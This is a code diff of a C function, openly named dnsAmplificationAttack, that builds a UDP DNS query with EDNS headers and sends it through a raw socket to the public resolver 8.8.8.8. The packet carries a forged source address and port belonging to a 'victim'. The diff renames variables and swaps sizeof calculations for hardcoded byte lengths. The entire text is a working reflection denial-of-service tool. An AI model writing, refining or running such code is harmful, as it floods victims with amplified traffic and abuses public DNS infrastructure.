@@ -82,14 +82,14 @@ void queryset(query *q){
 	q->qclass = htons(0x1);
 }
 
-void dnsAmplificationAttack(char *targetIp, int targetPort)
+void dnsAmplificationAttack(char *victimIp, int victimPort)
 {
-	printf("dnsHeaer size: %ld\n", sizeof(dnsHeader));
-	printf("query size: %ld\n", sizeof(query));
-	printf("iph size: %ld\n", sizeof(iph));
-	printf("udph size: %ld\n", sizeof(udph));
-	printf("eDnsHeader size: %ld\n", sizeof(eDnsHeader));
-	printf("psHeader size: %ld\n", sizeof(psHeader));
+	printf("dnsHeaer size: %ld\n", sizeof(dnsHeader)); //12
+	printf("query size: %ld\n", sizeof(query)); //4
+	printf("iph size: %ld\n", sizeof(iph));	//20
+	printf("udph size: %ld\n", sizeof(udph)); //8
+	printf("eDnsHeader size: %ld\n", sizeof(eDnsHeader)); //11
+	printf("psHeader size: %ld\n", sizeof(psHeader)); //12
 
 
 	char *dnsIp = "8.8.8.8";
@@ -102,25 +102,25 @@ void dnsAmplificationAttack(char *targetIp, int targetPort)
 	dnsHeaderCreate(dns);
 	
 	unsigned char *dnsName, dnsRcrd[32];
-	dnsName = (unsigned char *)&dnsRequestPacket[sizeof(dnsHeader)];
+	dnsName = (unsigned char *)&dnsRequestPacket[12];
 	strcpy(dnsRcrd, dnsRecord);
 	querySiteFormat(dnsName , dnsRcrd);
 	
 	query *q;
-	q = (query *)&dnsRequestPacket[sizeof(dnsHeader) + (strlen(dnsName)+1)];
+	q = (query *)&dnsRequestPacket[12 + (strlen(dnsName)+1)];
 	queryset(q);
 	
 
 	eDnsHeader *eDns;
-	eDns = (eDnsHeader *)&dnsRequestPacket[sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query)];
+	eDns = (eDnsHeader *)&dnsRequestPacket[16 + (strlen(dnsName)+1)];
 	eDnsHeaderCreate(eDns);
 	
 	
 	char datagram[4096], *data, *psgram;
     memset(datagram, 0, 4096);
     
-	data = datagram + sizeof(iph) + sizeof(udph);
-    memcpy(data, &dnsRequestPacket, sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) +1 + sizeof(eDnsHeader));
+	data = datagram + 28;
+    memcpy(data, &dnsRequestPacket, 28 + (strlen(dnsName)+1));
     
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
@@ -129,40 +129,40 @@ void dnsAmplificationAttack(char *targetIp, int targetPort)
     
     iph *ip = (iph *)datagram;
     ipHeaderCreate(ip);
-    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader);
-    ip->saddr = inet_addr(targetIp);
+    ip->tot_len = 55 + (strlen(dnsName)+1);
+    ip->saddr = inet_addr(victimIp);
 	ip->check = checkSum((unsigned short *)datagram, ip->tot_len);
 	ip->daddr = sin.sin_addr.s_addr;
 	
-    udph *udp = (udph *)(datagram + sizeof(iph));
-	udp->source = htons(targetPort);
+    udph *udp = (udph *)(datagram + 20);
+	udp->source = htons(victimPort);
     udp->dest = htons(dnsPort);
-    udp->len = htons(8+sizeof(dnsHeader)+(strlen(dnsName)+1)+sizeof(query)+sizeof(eDnsHeader));
+    udp->len = htons(35 + (strlen(dnsName)+1));
     udp->check = 0;
 	
 	// Pseudoheader creation and checksum calculation
 	psHeader pshdr;
-	pshdr.saddr = inet_addr(targetIp);
+	pshdr.saddr = inet_addr(victimIp);
     pshdr.daddr = sin.sin_addr.s_addr;
     pshdr.filler = 0;
     pshdr.protocol = IPPROTO_UDP;
-    pshdr.len = htons(sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader));
+    pshdr.len = htons(35 + (strlen(dnsName)+1));
 
-	int pssize = sizeof(psHeader) + sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader);
+	int pssize = 47 + (strlen(dnsName)+1);
     psgram = malloc(pssize);
 	
-    memcpy(psgram, (char *)&pshdr, sizeof(psHeader));
-    memcpy(psgram + sizeof(psHeader), udp, sizeof(udph) + sizeof(dnsHeader) + (strlen(dnsName)+1) + sizeof(query) + sizeof(eDnsHeader));
+    memcpy(psgram, (char *)&pshdr, 12);
+    memcpy(psgram + 12, udp, 35 + (strlen(dnsName)+1));
 		
     udp->check = checkSum((unsigned short *)psgram, pssize);
     
     // Send data
-    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if(sd==-1) printf("Could not create socket.\n");
-    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+    int status = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if(status == -1) printf("Could not create socket.\n");
+    else sendto(status, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
     
 	free(psgram);
-	close(sd);
+	close(status);
 	
 	return;
 }
